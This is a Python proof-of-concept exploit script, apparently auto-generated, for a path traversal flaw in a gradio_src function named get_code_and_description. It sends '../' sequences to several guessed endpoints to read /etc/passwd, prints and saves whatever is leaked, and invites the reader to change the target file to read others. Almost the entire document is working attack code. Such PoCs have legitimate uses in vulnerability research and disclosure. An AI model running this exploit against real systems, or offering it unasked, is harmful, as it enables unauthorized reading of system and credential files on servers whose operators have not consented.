#!/usr/bin/env python3
# PoC for gradio_src (/tmp/gradio_src)
# Path: suspicious-006
# Sink: get_code_and_description
# Auto-generated — run with: python3 lfi_supply_demo_name_containing_get_code_and_description.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI vulnerability in gradio_src.

Vulnerability: Path traversal in get_code_and_description() function.
The function uses user-controlled `demo_name` parameter in os.path.join()
without sanitization, allowing directory traversal via '../' sequences.

Impact: An attacker can read arbitrary files on the system by supplying
a crafted demo_name parameter containing path traversal sequences.
"""

import requests
import sys
import os

# Configuration - modify these as needed
TARGET_URL = "http://localhost:8000"  # Default target, change to actual server
TIMEOUT = 10  # Request timeout in seconds

def exploit_lfi(target_url, file_to_read="/etc/passwd"):
    """
    Attempt to read arbitrary files via path traversal in demo_name parameter.
    
    The vulnerable endpoint is expected to be something like:
    /api/demos/<demo_name>
    
    We'll try common endpoint patterns since the exact route isn't specified.
    """
    
    # Construct path traversal payload
    # We need to go up from GRADIO_DEMO_DIR to root, then to target file
    # Assuming GRADIO_DEMO_DIR is at a reasonable depth (e.g., /app/demos)
    traversal_depth = "../" * 10  # Go up enough directories to reach root
    payload = f"{traversal_depth}{file_to_read.lstrip('/')}"
    
    # Try different endpoint patterns that might expose this function
    endpoints = [
        f"/api/demos/{payload}",
        f"/demos/{payload}",
        f"/api/get_code_and_description/{payload}",
        f"/demo/{payload}",
    ]
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Attempting to read: {file_to_read}")
    print(f"[*] Payload: {payload}")
    print()
    
    for endpoint in endpoints:
        url = f"{target_url.rstrip('/')}{endpoint}"
        print(f"[*] Trying: {url}")
        
        try:
            response = requests.get(url, timeout=TIMEOUT, allow_redirects=False)
            
            if response.status_code == 200 and len(response.text) > 0:
                print(f"[+] SUCCESS! Status: {response.status_code}")
                print(f"[+] Response length: {len(response.text)} bytes")
                print(f"[+] Content preview:")
                print("-" * 50)
                # Print first 500 characters of response
                print(response.text[:500])
                print("-" * 50)
                
                # Save to file for analysis
                output_file = f"lfi_output_{os.path.basename(file_to_read)}"
                with open(output_file, 'w') as f:
                    f.write(response.text)
                print(f"[+] Full response saved to: {output_file}")
                return True
            else:
                print(f"[-] Status: {response.status_code}, Length: {len(response.text)}")
                
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection error - is the server running at {target_url}?")
        except requests.exceptions.Timeout:
            print(f"[-] Request timed out after {TIMEOUT} seconds")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    print("\n[-] No successful exploitation found with tested endpoints")
    print("[*] You may need to adjust the endpoint path or traversal depth")
    return False

def main():
    """Main function with configurable target."""
    
    # Allow command-line arguments for flexibility
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = TARGET_URL
    
    # Benign test file to read (safe by default)
    test_file = "/etc/passwd"  # Standard test file, exists on most Linux systems
    
    print("=" * 60)
    print("Gradio Src LFI Proof-of-Concept Exploit")
    print("=" * 60)
    print()
    
    success = exploit_lfi(target, test_file)
    
    if success:
        print("\n[+] Vulnerability confirmed! The server is vulnerable to path traversal.")
        print("[+] You can modify the script to read other files by changing file_to_read.")
    else:
        print("\n[-] Could not confirm vulnerability with current configuration.")
        print("[*] Possible reasons:")
        print("  - Server is not running at the specified URL")
        print("  - Endpoint path is different (check the actual API routes)")
        print("  - Traversal depth is insufficient (try increasing '../' count)")
        print("  - File doesn't exist at the expected location")

if __name__ == "__main__":
    main()
